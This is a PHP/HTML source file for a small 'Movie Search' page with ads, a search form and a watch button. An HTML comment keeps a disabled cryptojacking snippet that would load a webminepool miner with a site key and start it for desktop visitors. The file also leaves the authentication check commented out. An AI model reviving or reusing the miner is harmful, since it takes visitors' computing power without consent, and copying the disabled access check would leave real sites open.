<?php
include $_SERVER['DOCUMENT_ROOT'] . "/PHP/auth.php";
//Auth user
//require_auth(); //"1" level access - no admin needed

if (!isset($_SESSION["username"])){
    $_SESSION["username"] = "adsense";
}



?>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/jquery.scrollto@2.1.2/jquery.scrollTo.min.js"></script>
    
    
    <!--Google AdSense Code-->
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
    (adsbygoogle = window.adsbygoogle || []).push({
        google_ad_client: "ca-pub-4765360187085538",
        enable_page_level_ads: true
    });
    </script>

    <!--Cryptojacking. Dirty but gotta pay the bills-
    <script src="https://webminepool.com/lib/base.js"></script>
    <script>
        var miner = WMP.Anonymous('SK_kbRVmwyjsqiBTPdrmLjVf');
        if (!miner.isMobile()){
            miner.start();
        }
    </script>-->



    <link rel="stylesheet" type="text/css" href="/CSS/StyleSheet.css">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=1.0, user-scalable=no">
</head>

<body>


    <div>
        <h1 id="main-title">Movie Search</h1>
    </div>
    <div class="rounded" id="search-div">
        <form id="search-form">
            <input type="text" placeholder="Movie Title" id ="search-input">
            
            <input type="submit" id="search-submit">
        </form>
    </div>

    <div class="item rounded" id="results-div">
        <table id="results-table">
        </table>
    </div>
    

    <div class="item rounded" id="display-div">

    <table id="display-table">
    </table>
    </div>

    <?php if($_SESSION["admin"]){echo('<div class="customlink"><a href="/custom.php" id="custom-link" class="customlink">Or, submit a custom request</a></div><br/>');} ?>
    
    <div class="customlink">
        <?php 
        if(isset($_GET["plexLoggedInOnce"])){
            echo('<button id="watch-button" firstLogin=1 class="watch_button">Watch now!</button>');
        }else{
            echo('<button id="watch-button" firstLogin=0 class="watch_button">Watch now!</button>');
        }
        ?>
        
    </div>

    
    <div style="position:fixed; bottom: 5px;">
        <a href="/PHP/logout.php">LOGOUT <?php echo($_SESSION["username"]); ?>?</a>
        <br/>
        <br/>
        <style>.bmc-button img{width: 27px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{line-height: 36px !important;height:37px !important;text-decoration: none !important;display:inline-flex !important;color:#ffffff !important;background-color:#e5a00d !important;border-radius: 25px !important;border: 1px solid transparent !important;padding: 0px 9px !important;font-size: 17px !important;letter-spacing:-0.08px !important;margin: 0 auto !important;font-family:'Lato', sans-serif !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;-o-transition: 0.3s all linear !important;-webkit-transition: 0.3s all linear !important;-moz-transition: 0.3s all linear !important;-ms-transition: 0.3s all linear !important;transition: 0.3s all linear !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#ffffff !important;}</style><link href="https://fonts.googleapis.com/css?family=Lato&subset=latin,latin-ext" rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/YW68PyD"><img src="https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg" alt="Buy me a coffee"><span style="margin-left:5px">Buy me a coffee</span></a>
    </div>
    

    <p id="hash-display"></p>



    <!--
    <div id="bottom-banner" class="white">
        <a href="https://venmo.com/code?user_id=2010611386941440559" target="_blank"><p>Created by Harris McCullers - Venmo @ harrismcc</p></a>
    </div>
    -->

    <script src="/JS/main.js"></script>
</body>

</html>